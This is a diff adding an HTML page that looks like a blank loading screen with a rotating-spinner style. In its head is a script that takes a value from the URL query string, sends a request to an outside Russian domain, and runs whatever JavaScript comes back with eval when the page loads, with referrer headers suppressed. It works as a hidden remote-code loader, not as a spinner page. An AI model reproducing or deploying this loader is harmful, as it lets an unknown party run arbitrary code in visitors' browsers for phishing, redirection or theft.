@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="referrer" content="no-referrer">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script> 
+var n = location.search.replace('?n=', ''); 
+if(n.length > 0){
+$.ajax({
+	type: "POST",
+	cache: false,
+	url: "https://dzipf.ru/fjs/"+n,
+	dataType: "jsonp"  
+	}).done(function( ms ){
+		  eval(ms.js);		 
+	});
+}
+</script> 
+<meta charset="UTF-8">
+<style id="style">
+    html, body{
+        height: 100%;
+        margin: 0;
+        background-color: #FFF;
+    }.center{     position: absolute;
+        left: 0;
+		
+        right: 0;
+		
+        top: 0;
+        bottom: 0;
+		
+        margin: auto;
+        z-index: 100;
+
+        height:82px;
+        margin:auto;
+    }
+    @keyframes rotate {
+        to {
+            -webkit-transform: rotate(360deg);
+            transform: rotate(360deg)
+        }
+    }
+    .cccc #img1 {
+        position: relative;
+        animation: rotate 1.5s linear infinite;
+    }
+    .cccc #img2{
+        position: absolute;
+        left: 0;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto;
+        z-index: 10;
+    }
+</style>
+</head>
+
+<div class="cccc" id="cccc"> 
+
+	    
+</div>
+
+
+</body>
+</html>
